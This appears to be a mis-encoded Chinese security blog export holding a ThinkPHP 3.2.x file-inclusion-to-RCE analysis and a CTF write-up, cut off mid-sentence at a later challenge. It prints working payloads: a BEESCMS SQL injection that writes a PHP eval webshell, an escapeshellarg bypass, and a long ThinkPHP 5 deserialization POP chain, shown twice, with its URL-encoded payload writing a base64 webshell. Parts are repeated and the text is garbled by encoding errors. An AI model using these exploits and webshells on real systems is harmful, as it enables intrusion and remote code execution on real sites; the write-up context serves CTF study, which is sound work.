é¦–å…ˆæˆ‘ä»¬çš„å¯æ§å‚æ•°é€šè¿‡Controller.class.phpä¸­çš„assignå‡½æ•°æœ€ç»ˆè·³åˆ°äº†View.class.phpä¸­çš„assignå‡½æ•°ï¼š åœ¨è¯¥å‡½æ•°ä¸­å°†å…¶èµ‹å€¼ç»™$this-\u0026gt;tVarå˜é‡ï¼š\nèµ‹å€¼ç»“æŸåå›åˆ°IndexControllerå†è¿›å…¥åˆ°displayå‡½æ•°ï¼Œå’Œä¸Šé¢çš„assignå‡½æ•°ä¸€æ ·æœ€ç»ˆè·³åˆ°View.class.phpçš„displayå‡½æ•°ä¸­ï¼Œè¯¥å‡½æ•°ä¸­çš„fetchå‡½æ•°è§£æå¹¶è·å–æ¨¡æ¿æ–‡ä»¶å†…å®¹ï¼Œæ­¤æ—¶æ¨¡æ¿æ–‡ä»¶è·¯å¾„å’Œå†…å®¹ä¸ºç©ºï¼š\nç»§ç»­è·Ÿè¿›fetchå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¸­å°†ç©ºçš„templateFileä¼ å…¥parseTemplateå‡½æ•°:\nå½“å‚æ•°ä¸ºç©ºæ—¶ï¼ŒparseTemplateå‡½æ•°è¿”å›é»˜è®¤çš„æ¨¡æ¿æ–‡ä»¶ä½ç½®./Application/Home/View/Index/index.html\næ¥ç€å¾€ä¸‹èµ°ï¼Œç³»ç»Ÿé…ç½®çš„é»˜è®¤æ¨¡æ¿å¼•æ“ä¸ºthinkï¼Œæ‰€ä»¥ç¨‹åºè¿›å…¥elseåˆ†æ”¯\nå°†this-\u0026gt;tVaræ”¾å…¥paramså˜é‡ä¸­è·³å…¥Hook::listenï¼Œtagå˜é‡æ˜¯å†™æ­»çš„view_parseï¼Œå› æ­¤nameå˜é‡ä¸ºBehavior\\ParseTemplateBehaviorï¼Œæ¥ç€è¿›å…¥self::exec\nåœ¨execå‡½æ•°ä¸­è°ƒç”¨Behavior\\ParseTemplateBehaviorçš„runæ–¹æ³•å¤„ç†å¸¦æœ‰æˆ‘ä»¬å¯æ§å‚æ•°çš„$paramså˜é‡ï¼š\nåœ¨runæ–¹æ³•ä¸­ç»è¿‡ä¸€äº›åˆ¤æ–­ï¼Œæœ€ç»ˆè°ƒç”¨fetchå‡½æ•°ç¼–è¯‘å¹¶åŠ è½½æ¨¡æ¿æ–‡ä»¶ï¼Œæ­¤æ—¶ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬çš„å¯æ§å‚æ•°ï¼šarray(\u0026quot;_filename\u0026quot;=\u0026gt;\u0026ldquo;C://config.ini\u0026rdquo;);\nç»§ç»­è·Ÿè¿›fetchï¼Œè·å–ç¼“å­˜æ–‡ä»¶è·¯å¾„åï¼Œè¿›å…¥Storageçš„loadæ–¹æ³•ä¸­ï¼š\nåœ¨loadæ–¹æ³•ä¸­ï¼Œ$_filenameä¸ºä¹‹å‰è·å–çš„ç¼“å­˜æ–‡ä»¶è·¯å¾„ï¼Œ$varåˆ™ä¸ºä¹‹å‰å¸¦æœ‰_filename=C://config.iniçš„æ•°ç»„ï¼Œåˆ©ç”¨extractæ–¹æ³•è¿›è¡Œå˜é‡è¦†ç›–ï¼Œå®ç°ä»»æ„æ–‡ä»¶åŒ…å«ï¼š\nä¼—æ‰€å‘¨çŸ¥ï¼Œincludeå‡½æ•°ä¸åœ¨æ„åŒ…å«çš„ä»€ä¹ˆæ–‡ä»¶ï¼š\nå› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªä¸å­˜åœ¨çš„æ¨¡å—ï¼Œä½¿å¾—tpæŠ¥é”™ï¼Œæ­¤æ—¶tpä¼šå°†urlå†™å…¥logä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨urlä¸­å†™å…¥æ¶æ„ä»£ç ï¼Œå†ç»“åˆä¸Šé¢çš„LFIå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚\n======= title: \u0026ldquo;TP3.2.xRCE\u0026rdquo; date: 2021-08-14T16:19:19+08:00 categories:\næ¼æ´å¤ç° tags: TP web å‰æ®µæ—¶é—´æ‰“æ¯”èµ›çš„æ—¶å€™é‡åˆ°äº†Think PHP3.2.x RCEçš„é¢˜ç›®ï¼Œè¿™ä¸ªæ´æ˜¯ä¸Šä¸ªæœˆçˆ†å‡ºæ¥çš„ï¼šã€æ¼æ´é€šæŠ¥ã€‘ThinkPHP3.2.x RCEæ¼æ´é€šæŠ¥ã€‚è™½ç„¶3å·²ç»ä¸æ˜¯ä¸»æµç‰ˆæœ¬äº†ï¼Œä½†æ˜¯è€ƒè™‘åˆ°è¿˜æ˜¯æœ‰ä¸å°‘è€çš„ç«™åœ¨ç”¨ï¼Œæ‰€ä»¥è¿˜æ˜¯æœ‰ä¸€å®šçš„ä»·å€¼çš„ï¼Œè¿™é‡Œåˆ†æä¸€ä¸‹ã€‚\nåˆ©ç”¨ è¿™é‡Œç”¨çš„æ˜¯Think PHP3.2.5å®Œæ•´ç‰ˆï¼Œå…·ä½“æ¯ä¸ªç‰ˆæœ¬ä¹‹é—´çš„åŒºåˆ«å¯ä»¥çœ‹çœ‹å‚è€ƒé“¾æ¥\nåˆ©ç”¨çš„æ¡ä»¶æ˜¯assignæ–¹æ³•çš„ç¬¬ä¸€ä¸ªå˜é‡å¯æ§ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨indexControllerå†™å…¥demoï¼š\n1 2 3 4 public function index($value=\u0026#39;\u0026#39;){ $this-\u0026gt;assign($value); $this-\u0026gt;display(); } payloadï¼š?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=.\\Application\\Runtime\\Logs\\Home\\21_06_30.log\næœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œå†ç»“åˆæŠ¥é”™å†™logæœ€ç»ˆè¾¾åˆ°rceçš„ç›®çš„\nåˆ†æ è¿™é‡Œæˆ‘ä»¬å…ˆä¸åŒ…å«logï¼Œè€Œæ˜¯åŒ…å«config.iniæ¥åˆ†ææ–‡ä»¶åŒ…å«ï¼Œpayloadï¼š\n1 ?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=C://config.ini é¦–å…ˆæˆ‘ä»¬çš„å¯æ§å‚æ•°é€šè¿‡Controller.class.phpä¸­çš„assignå‡½æ•°æœ€ç»ˆè·³åˆ°äº†View.class.phpä¸­çš„assignå‡½æ•°ï¼š åœ¨è¯¥å‡½æ•°ä¸­å°†å…¶èµ‹å€¼ç»™$this-\u0026gt;tVarå˜é‡ï¼š\nèµ‹å€¼ç»“æŸåå›åˆ°IndexControllerå†è¿›å…¥åˆ°displayå‡½æ•°ï¼Œå’Œä¸Šé¢çš„assignå‡½æ•°ä¸€æ ·æœ€ç»ˆè·³åˆ°View.class.phpçš„displayå‡½æ•°ä¸­ï¼Œè¯¥å‡½æ•°ä¸­çš„fetchå‡½æ•°è§£æå¹¶è·å–æ¨¡æ¿æ–‡ä»¶å†…å®¹ï¼Œæ­¤æ—¶æ¨¡æ¿æ–‡ä»¶è·¯å¾„å’Œå†…å®¹ä¸ºç©ºï¼š\nç»§ç»­è·Ÿè¿›fetchå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¸­å°†ç©ºçš„templateFileä¼ å…¥parseTemplateå‡½æ•°:\nå½“å‚æ•°ä¸ºç©ºæ—¶ï¼ŒparseTemplateå‡½æ•°è¿”å›é»˜è®¤çš„æ¨¡æ¿æ–‡ä»¶ä½ç½®./Application/Home/View/Index/index.html\næ¥ç€å¾€ä¸‹èµ°ï¼Œç³»ç»Ÿé…ç½®çš„é»˜è®¤æ¨¡æ¿å¼•æ“ä¸ºthinkï¼Œæ‰€ä»¥ç¨‹åºè¿›å…¥elseåˆ†æ”¯\nå°†this-\u0026gt;tVaræ”¾å…¥paramså˜é‡ä¸­è·³å…¥Hook::listenï¼Œtagå˜é‡æ˜¯å†™æ­»çš„view_parseï¼Œå› æ­¤nameå˜é‡ä¸ºBehavior\\ParseTemplateBehaviorï¼Œæ¥ç€è¿›å…¥self::exec\nåœ¨execå‡½æ•°ä¸­è°ƒç”¨Behavior\\ParseTemplateBehaviorçš„runæ–¹æ³•å¤„ç†å¸¦æœ‰æˆ‘ä»¬å¯æ§å‚æ•°çš„$paramså˜é‡ï¼š\nåœ¨runæ–¹æ³•ä¸­ç»è¿‡ä¸€äº›åˆ¤æ–­ï¼Œæœ€ç»ˆè°ƒç”¨fetchå‡½æ•°ç¼–è¯‘å¹¶åŠ è½½æ¨¡æ¿æ–‡ä»¶ï¼Œæ­¤æ—¶ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬çš„å¯æ§å‚æ•°ï¼šarray(\u0026quot;_filename\u0026quot;=\u0026gt;\u0026ldquo;C://config.ini\u0026rdquo;);\nç»§ç»­è·Ÿè¿›fetchï¼Œè·å–ç¼“å­˜æ–‡ä»¶è·¯å¾„åï¼Œè¿›å…¥Storageçš„loadæ–¹æ³•ä¸­ï¼š\nåœ¨loadæ–¹æ³•ä¸­ï¼Œ$_filenameä¸ºä¹‹å‰è·å–çš„ç¼“å­˜æ–‡ä»¶è·¯å¾„ï¼Œ$varåˆ™ä¸ºä¹‹å‰å¸¦æœ‰_filename=C://config.iniçš„æ•°ç»„ï¼Œåˆ©ç”¨extractæ–¹æ³•è¿›è¡Œå˜é‡è¦†ç›–ï¼Œå®ç°ä»»æ„æ–‡ä»¶åŒ…å«ï¼š\nä¼—æ‰€å‘¨çŸ¥ï¼Œincludeå‡½æ•°ä¸åœ¨æ„åŒ…å«çš„ä»€ä¹ˆæ–‡ä»¶ï¼š\nå› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªä¸å­˜åœ¨çš„æ¨¡å—ï¼Œä½¿å¾—tpæŠ¥é”™ï¼Œæ­¤æ—¶tpä¼šå°†urlå†™å…¥logä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨urlä¸­å†™å…¥æ¶æ„ä»£ç ï¼Œå†ç»“åˆä¸Šé¢çš„LFIå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚\nef5418316bb4efc68bd96772d45afc77caf7808c\n","date":"2021-08-14T16:19:19+08:00","permalink":"https://k1te.cn/p/tp3.2.xrce/","title":"TP3.2.xRCE"},{"content":"emmï¼Œæ€ä¹ˆè¯´å‘¢ï¼Œå¯èƒ½æ˜¯ä¸ºäº†é…åˆå¤ä»¤è¥å§ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯æ¡†æ¶é¢˜ï¼Œç½‘ä¸Šæœä¸€ä¸‹å°±å·®ä¸å¤šèƒ½æ‰¾åˆ°äº†ï¼Œä½†æ˜¯å®è¯å®è¯´ï¼Œé¢˜ç›®è´¨é‡ç¡®å®ä¸€èˆ¬\nWeb ezrce å‚è€ƒï¼šYapiè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç° - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·ï¼Œç›´æ¥æ‰“å°±è¡Œ\ncat flag ç›´æ¥ç»™æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php if (isset($_GET[\u0026#39;cmd\u0026#39;])) { $cmd = $_GET[\u0026#39;cmd\u0026#39;]; if (!preg_match(\u0026#39;/flag/i\u0026#39;,$cmd)) { $cmd = escapeshellarg($cmd); system(\u0026#39;cat \u0026#39; . $cmd); } } else { highlight_file(__FILE__); } ?\u0026gt; cmdå‚æ•°ä¸èƒ½åŒ…å«flagå…³é”®è¯ï¼Œç„¶åç»è¿‡escapeshellargå‡½æ•°ä¹‹åæ‰§è¡Œcatå‘½ä»¤ã€‚\næœ‰ä¸ªhintï¼šç®¡ç†å‘˜æ›¾è®¿é—®è¿‡flagã€‚\nç»è¿‡ä¸€ç•ªæŸ¥æ‰¾ï¼Œæ‰¾åˆ°äº†nignxçš„access.logï¼Œpayload:/?cmd=/var/log/nginx/access.logï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª/this_is_final_flag_e2a457126032b42d.phpï¼Œåº”è¯¥å°±æ˜¯è¦catè¿™ä¸ªæ–‡ä»¶äº†ï¼Œä½†æ˜¯æ–‡ä»¶åé‡ŒåŒ…å«äº†flagå…³é”®è¯ï¼Œè€Œä¸”åˆç»è¿‡äº†escapeshellargå‡½æ•°ï¼Œæ²¡æ³•å‘½ä»¤æ³¨å…¥\næ‰¾äº†è›®ä¹…çš„ï¼Œæœ€ååœ¨æ–‡æ¡£é‡Œæ‰¾åˆ°è¿™ä¹ˆä¸€ä¸ªè¯„è®º\næ„æ€å¤§æ¦‚æ˜¯escapeshellargä¼šåœ¨æ²¡æœ‰è®¾ç½®langç¯å¢ƒå˜é‡çš„æ—¶å€™å°†éASCIIå­—ç¬¦ä¸¢å¼ƒï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨éASCIIå­—ç¬¦ç»•è¿‡ï¼Œæœ€ç»ˆpayloadï¼š/?cmd=this_is_final_fl%ffag_e2a457126032b42d.php\nå…¶å®æ—©ä¸Šçš„æ—¶å€™å°±çœ‹åˆ°äº†ç›¸å…³çš„æ–‡ç« ï¼š\nä½†æ˜¯å½“æ—¶å°è¯•çš„æ˜¯Äè¿™ä¸ªå­—ç¬¦ï¼Œä¸çŸ¥é“ä¸ºå•¥ä¸è¡Œ\neasythinkphp ä¸€ä¸ªthinkphp3.2.3æ¯”è¾ƒæ–°çš„æ´ï¼Œå‚è€ƒï¼šã€æ¼æ´é€šæŠ¥ã€‘ThinkPHP3.2.x RCEæ¼æ´é€šæŠ¥ (qq.com)\næœ€ç»ˆpayloadï¼š/?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=../../../flag\njspxcms å‚è€ƒï¼šå¤ç°jspxcmsè§£å‹getshellæ¼æ´ | lockcy\u0026rsquo;s cave\néœ€è¦ç®¡ç†å‘˜çš„æƒé™ï¼Œæ¯”èµ›çš„æ—¶å€™æ˜¯å…¬ç”¨é¶æœºï¼Œæ¯ååˆ†é’Ÿé‡ç½®ä¸€æ¬¡ï¼Œåˆšå¼€å§‹çš„æ—¶å€™è¿›ä¸äº†åå°æ‰¾ä¸åˆ°ç‚¹ï¼Œåé¢å°±ç›¯ç€é‡ç½®ç„¶åå†²è¿›å»æ”¹å¯†ç hh\néœ€è¦ç”¨åˆ°å†°èï¼Œå†°èçš„å‘å…·ä½“å‚è€ƒï¼šä¸ºå•¥å­java14è¿˜æ˜¯è¿è¡Œä¸äº† Â· Issue #115 Â· rebeyond/Behinder (github.com)\næœ€åï¼š\ncybercms www.zipæœ‰æºç \næ ¹æ®æºç çš„ä¿¡æ¯ç¡®å®šæ˜¯BEESCMSï¼Œç½‘ä¸Šå¯»æ‰¾ç›¸å…³æ¼æ´åˆ©ç”¨ï¼Œå¤§æ¦‚æ‰¾åˆ°è¿™ä¹ˆå‡ ç¯‡å§ï¼š\nã€ä»£ç å®¡è®¡åˆæ¢ã€‘beescms v4.0_R SQL_ç™½å¸½å­æŠ€æœ¯/æ€è·¯_iæ˜¥ç§‹ç¤¾åŒº-åˆ†äº«ä½ çš„æŠ€æœ¯ï¼Œä¸ºå®‰å…¨åŠ ç‚¹æ¸©åº¦. (ichunqiu.com)\nã€ä»£ç å®¡è®¡ã€‘å¯¹Beescms SQLæ³¨å…¥æ¼æ´çš„è¿›ä¸€æ­¥æ€è€ƒ_ç™½å¸½å­æŠ€æœ¯/æ€è·¯_iæ˜¥ç§‹ç¤¾åŒº-åˆ†äº«ä½ çš„æŠ€æœ¯ï¼Œä¸ºå®‰å…¨åŠ ç‚¹æ¸©åº¦. (ichunqiu.com)\nã€é€0dayã€‘ä»£ç å®¡è®¡å°±è¯¥è¿™ä¹ˆæ¥3 beescms getshell_ç™½å¸½å­æŠ€æœ¯/æ€è·¯_iæ˜¥ç§‹ç¤¾åŒº-åˆ†äº«ä½ çš„æŠ€æœ¯ï¼Œä¸ºå®‰å…¨åŠ ç‚¹æ¸©åº¦. (ichunqiu.com)\nsessionè¦†ç›–å¯ä»¥è¿›å…¥åå°ï¼Œä½†æ˜¯ä¸Šä¼ çš„æ—¶å€™æ˜¾ç¤ºpermission denyï¼Œäºæ˜¯è½¬å‘sqlæ³¨å…¥ã€‚\nä¸æºç å¯¹æ¯”å‘ç°å‡ºé¢˜äººå¢åŠ äº†ä¸€ä¸ªè¿‡æ»¤å‡½æ•°ï¼Œå¹¶ä¸”æŠŠæŠ¥é”™å…³äº†ï¼ˆæ²¡æ‰¾åˆ°æŠ¥é”™åœ¨å“ªå…³äº†ã€‚ã€‚ï¼‰ï¼š\nå¯ä»¥çœ‹åˆ°è¿™ä¸ªè¿‡æ»¤è¿˜æ˜¯å¾ˆå¥½ç»•çš„ï¼Œä¸Šé¢çš„ç”¨åŒå†™ç»•è¿‡ï¼Œä¸‹é¢çš„ç”¨/**/ç»•è¿‡å³å¯\nå®é™…æµ‹è¯•å‘ç°ç»è¿‡htmlspecialcharsçš„å­—ç¬¦å¯ä»¥æ³¨å…¥åˆ°sqlè¯­å¥ï¼Œä½†æ˜¯æ²¡æ³•æ­£å¸¸æ”¾è¿›æ•°æ®åº“é‡Œï¼ˆtclï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼‰\næœ€ç»ˆpayloadï¼šuser=admin%27/**/un+union+ion/**/selselectect/**/null,null,null,null,0x3c3f70687020686967686c696768745f66696c65285f5f46494c455f5f293b406576616c28245f504f53545b6b3174655d293b3f3e/**/into/**/outoutfilefile/**/%27/var/www/html/shell.php%27%23\næ•ˆæœï¼š\nez_website å‚è€ƒï¼šé½åšå»ºç«™ç³»ç»Ÿx1.0ä»£ç å®¡è®¡ - Ma4ter Blog\nlabelmodelsæ§åˆ¶å™¨get_labelæ–¹æ³•ç›´æ¥å°†tag_arraræ•°ç»„é”®cfgçš„å€¼è¿›è¡Œäº†ååºåˆ—åŒ–ï¼š\nç›´æ¥æ‹¿tp5çš„popé“¾æ‰“å°±è¡Œï¼Œç½‘ä¸Šæ‰¾äº†ä¸ªexpï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 \u0026lt;?php namespace think\\process\\pipes { class Windows { private $files = []; public function __construct($files) { $this-\u0026gt;files = [$files]; //$file =\u0026gt; /think/Modelçš„å­ç±»new Pivot(); Modelæ˜¯æŠ½è±¡ç±» } } } namespace think { abstract class Model{ protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) { $this-\u0026gt;parent = $output; //$this-\u0026gt;parent=\u0026gt; think\\console\\Output; $this-\u0026gt;append = array(\u0026#34;xxx\u0026#34;=\u0026gt;\u0026#34;getError\u0026#34;); //è°ƒç”¨getError è¿”å›this-\u0026gt;error $this-\u0026gt;error = $modelRelation; // $this-\u0026gt;error è¦ä¸º relationç±»çš„å­ç±»ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯OnetoOneç±»çš„å­ç±»==\u0026gt;\u0026gt;HasOne } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\\model\\relation{ class HasOne extends OneToOne { } } namespace think\\model\\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-\u0026gt;selfRelation = 0; $this-\u0026gt;query = $query; //$queryæŒ‡å‘Query $this-\u0026gt;bindAttr = [\u0026#39;xxx\u0026#39;];// $valueå€¼ï¼Œä½œä¸ºcallå‡½æ•°å¼•ç”¨çš„ç¬¬äºŒå˜é‡ } } } namespace think\\db { class Query { protected $model; function __construct($model) { $this-\u0026gt;model = $model; //$this-\u0026gt;model=\u0026gt; think\\console\\Output; } } } namespace think\\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-\u0026gt;styles = [\u0026#39;getAttr\u0026#39;]; $this-\u0026gt;handle =$handle; //$handle-\u0026gt;think\\session\\driver\\Memcached } } } namespace think\\session\\driver { class Memcached { protected $handler; function __construct($handle) { $this-\u0026gt;handler = $handle; //$handle-\u0026gt;think\\cache\\driver\\File } } } namespace think\\cache\\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-\u0026gt;options=[ \u0026#39;expire\u0026#39; =\u0026gt; 3600, \u0026#39;cache_subdir\u0026#39; =\u0026gt; false, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;path\u0026#39; =\u0026gt; \u0026#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php\u0026#39;, \u0026#39;data_compress\u0026#39; =\u0026gt; false, ]; $this-\u0026gt;tag = \u0026#39;xxx\u0026#39;; } } } namespace { $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo urlencode(serialize($window)); } \u0026lt;?php namespace think\\process\\pipes { class Windows { private $files = []; public function __construct($files) { $this-\u0026gt;files = [$files]; //$file =\u0026gt; /think/Modelçš„å­ç±»new Pivot(); Modelæ˜¯æŠ½è±¡ç±» } } } namespace think { abstract class Model{ protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) { $this-\u0026gt;parent = $output; //$this-\u0026gt;parent=\u0026gt; think\\console\\Output; $this-\u0026gt;append = array(\u0026#34;xxx\u0026#34;=\u0026gt;\u0026#34;getError\u0026#34;); //è°ƒç”¨getError è¿”å›this-\u0026gt;error $this-\u0026gt;error = $modelRelation; // $this-\u0026gt;error è¦ä¸º relationç±»çš„å­ç±»ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯OnetoOneç±»çš„å­ç±»==\u0026gt;\u0026gt;HasOne } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\\model\\relation{ class HasOne extends OneToOne { } } namespace think\\model\\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-\u0026gt;selfRelation = 0; $this-\u0026gt;query = $query; //$queryæŒ‡å‘Query $this-\u0026gt;bindAttr = [\u0026#39;xxx\u0026#39;];// $valueå€¼ï¼Œä½œä¸ºcallå‡½æ•°å¼•ç”¨çš„ç¬¬äºŒå˜é‡ } } } namespace think\\db { class Query { protected $model; function __construct($model) { $this-\u0026gt;model = $model; //$this-\u0026gt;model=\u0026gt; think\\console\\Output; } } } namespace think\\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-\u0026gt;styles = [\u0026#39;getAttr\u0026#39;]; $this-\u0026gt;handle =$handle; //$handle-\u0026gt;think\\session\\driver\\Memcached } } } namespace think\\session\\driver { class Memcached { protected $handler; function __construct($handle) { $this-\u0026gt;handler = $handle; //$handle-\u0026gt;think\\cache\\driver\\File } } } namespace think\\cache\\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-\u0026gt;options=[ \u0026#39;expire\u0026#39; =\u0026gt; 3600, \u0026#39;cache_subdir\u0026#39; =\u0026gt; false, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;path\u0026#39; =\u0026gt; \u0026#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../public/uploads/images/a.php\u0026#39;, \u0026#39;data_compress\u0026#39; =\u0026gt; false, ]; $this-\u0026gt;tag = \u0026#39;xxx\u0026#39;; } } } namespace { $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo urlencode(serialize($window)); } æ–‡ä»¶åçš„ç”Ÿæˆè§„åˆ™æ˜¯ï¼šåŸæœ¬çš„æ–‡ä»¶å+md5('tag_'+md5($this-\u0026gt;tag))+'.php'ï¼Œè¿™é‡Œçš„è¯å°±æ˜¯'a.php'+md5('tag_'+md5('xxx'))+'.php'ï¼Œå³a.php12ac95f1498ce51d2d96a249c09c1998.php\næœ‰ä¸ªå°å‘ï¼Œè¿™é‡Œçš„æ ¹ç›®å½•ä¸å¯å†™ï¼Œæ‰€ä»¥æ— æ³•æˆåŠŸå†™é©¬ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¢åˆ°/public/uploads/imagesè¿™ä¸ªç›®å½•ä¸‹é¢ï¼Œæˆ–è€…/runtime/tempè¿™ä¸ªç›®å½•ä¹Ÿè¡Œï¼Œæœ€ç»ˆpayloadï¼š\n1 /index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A144%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fpublic%2Fuploads%2Fimages%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D æœ€åæ‰§è¡Œæ ¹ç›®å½•çš„readflagå³å¯ï¼š\njj\u0026rsquo;s camera æŒºæœ‰æ„æ€çš„ä¸€é“é¢˜ç›®ã€‚\næ‰“å¼€ä¹‹åçš„é¡µé¢æ˜¯è¿™æ ·çš„ï¼š\nç‚¹å‡»ç”Ÿæˆé“¾æ¥ä¹‹ååº•ä¸‹ä¼šç”Ÿæˆä¸€ä¸ªå¯ä»¥è·³è½¬çš„é“¾æ¥ï¼š\nä½†æ˜¯é™¤äº†å¼¹å‡ºä¸€ä¸ªæ¡†å°±å•¥ä¹Ÿæ²¡äº†ï¼š\nç„¶åç‚¹å‡»æŸ¥çœ‹ç…§ç‰‡ä¹Ÿæ˜¯ä¸€ç›´æ˜¾ç¤ºæ²¡æœ‰ç…§ç‰‡ï¼š\næ‡µäº†åŠå¤©ï¼Œç„¶åæ‹¿åˆ°Firefoxæ‰“å¼€çš„æ—¶å€™ï¼Œå‘ç°å®ƒæç¤ºæˆ‘æ˜¯å¦å…è®¸å¼€å¯æ‘„åƒå¤´æƒé™ï¼Œè”æƒ³åˆ°é¢˜ç›®çš„åå­—â€jj\u0026rsquo;s cameraâ€œï¼ŒæŠŠæ‘„åƒå¤´çš„æƒé™ç»™äº†ä»–çœ‹çœ‹ï¼Œåæ­£å’±ä¹Ÿè´´äº†èƒ¶å¸ƒä¸æ˜¯ã€‚ç„¶åä¼šå‘ç°ä»–ä¼šæ‹ä¸‹ä¸€å¼ 